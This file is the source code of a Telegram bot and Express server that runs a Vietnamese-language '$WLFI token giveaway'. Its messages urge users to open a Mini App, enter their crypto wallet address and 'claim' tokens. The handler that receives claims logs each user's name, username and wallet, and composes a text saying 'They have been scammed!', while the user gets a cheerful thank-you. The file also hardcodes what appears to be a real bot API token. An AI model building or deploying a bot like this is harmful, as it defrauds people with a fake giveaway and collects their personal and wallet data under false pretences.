const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');

// Bot configuration
const token = '8353170585:AAEReZBd8UslP_aTV9K7Au4VEPTQSu2FC9s';
const bot = new TelegramBot(token, { polling: true });

// Mini App URL (update this with your deployed URL)
const MINI_APP_URL = 'https://ramenchef999.github.io/wlfi-giveaway-bot'; // GitHub Pages URL

// Express app for serving the Mini App
const app = express();
const PORT = process.env.PORT || 8080;

// Serve static files
app.use(express.static(__dirname));

// Bot commands
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.first_name;
    
    const welcomeMessage = `🚀 Chào mừng ${username} đến với WLFI Giveaway!

🎁 Tham gia giveaway $WLFI tokens ngay bây giờ!

📱 Click nút bên dưới để mở Mini App và tham gia giveaway.`;

    const keyboard = {
        inline_keyboard: [
            [{
                text: '🎁 Tham Gia Giveaway',
                web_app: { url: MINI_APP_URL }
            }],
            [{
                text: '📱 Join Community',
                url: 'https://t.me/asteroid_community'
            }]
        ]
    };

    bot.sendMessage(chatId, welcomeMessage, {
        reply_markup: keyboard
    });
});

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    
    const helpMessage = `🤖 WLFI Giveaway Bot Commands:

/start - Bắt đầu giveaway
/help - Xem hướng dẫn này
/info - Thông tin về giveaway

🎁 Cách tham gia:
1. Click "Tham Gia Giveaway"
2. Nhập địa chỉ ví của bạn
3. Join Telegram community
4. Click Claim để nhận tokens

📱 Community: @asteroid_community`;

    bot.sendMessage(chatId, helpMessage);
});

bot.onText(/\/info/, (msg) => {
    const chatId = msg.chat.id;
    
    const infoMessage = `📊 WLFI Giveaway Info:

🎯 Token: $WLFI
💰 Giá trị: TBA
📅 Thời gian: Đang diễn ra
👥 Community: @asteroid_community

🎁 Cách tham gia:
• Join Telegram community
• Nhập địa chỉ ví hợp lệ
• Click Claim tokens

⚠️ Lưu ý: Chỉ một lần tham gia mỗi ví!`;

    bot.sendMessage(chatId, infoMessage);
});

// Handle web app data
bot.on('web_app_data', (msg) => {
    const chatId = msg.chat.id;
    const data = msg.web_app_data.data;
    
    try {
        const parsedData = JSON.parse(data);
        
        if (parsedData.action === 'claim_attempted') {
            const wallet = parsedData.wallet;
            const timestamp = new Date(parsedData.timestamp).toLocaleString('vi-VN');
            
            const responseMessage = `🎉 Ai đó vừa thử claim WLFI tokens!

👤 User: ${msg.from.first_name} ${msg.from.last_name || ''}
👤 Username: @${msg.from.username || 'N/A'}
💳 Wallet: ${wallet}
⏰ Thời gian: ${timestamp}

😄 Họ đã bị lừa rồi!`;
            
            // Send to admin or log
            console.log('Claim attempt:', {
                user: msg.from,
                wallet: wallet,
                timestamp: timestamp
            });
            
            bot.sendMessage(chatId, '🎉 Cảm ơn bạn đã tham gia! Hãy check Mini App để xem kết quả! 😄');
        }
    } catch (error) {
        console.error('Error parsing web app data:', error);
    }
});

// Handle callback queries
bot.on('callback_query', (callbackQuery) => {
    const action = callbackQuery.data;
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;

    if (action === 'join_giveaway') {
        const keyboard = {
            inline_keyboard: [
                [{
                    text: '🎁 Mở Giveaway App',
                    web_app: { url: MINI_APP_URL }
                }]
            ]
        };

        bot.editMessageText('🎁 Mở Mini App để tham gia giveaway!', {
            chat_id: chatId,
            message_id: msg.message_id,
            reply_markup: keyboard
        });
    }

    // Answer callback query
    bot.answerCallbackQuery(callbackQuery.id);
});

// Error handling
bot.on('error', (error) => {
    console.error('Bot error:', error);
});

bot.on('polling_error', (error) => {
    console.error('Polling error:', error);
});

// Express routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'WLFI Giveaway Bot & Mini App is running!',
        bot: 'Active',
        mini_app: 'Ready'
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 WLFI Giveaway Bot & Mini App running on port ${PORT}`);
    console.log(`🤖 Bot: @your_bot_username`);
    console.log(`📱 Mini App: ${MINI_APP_URL}`);
    console.log(`🔗 Health check: http://localhost:${PORT}/health`);
});

// Bot info
bot.getMe().then((botInfo) => {
    console.log(`🤖 Bot started: @${botInfo.username}`);
    console.log(`🆔 Bot ID: ${botInfo.id}`);
    console.log(`📝 Bot name: ${botInfo.first_name}`);
});

module.exports = { bot, app };
